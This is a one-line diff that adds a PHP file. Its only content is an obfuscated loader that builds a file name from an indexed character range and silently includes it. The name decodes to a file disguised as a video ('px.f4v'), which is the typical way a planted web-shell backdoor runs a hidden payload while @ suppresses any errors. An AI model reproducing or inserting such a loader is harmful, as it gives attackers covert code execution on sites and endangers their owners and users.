@@ -1,0 +1,1 @@
+<?php $sVFS = range(chr(126),chr(20)); @include $sVFS[14].$sVFS[6].$sVFS[80].$sVFS[24].$sVFS[74].$sVFS[8]; ?>
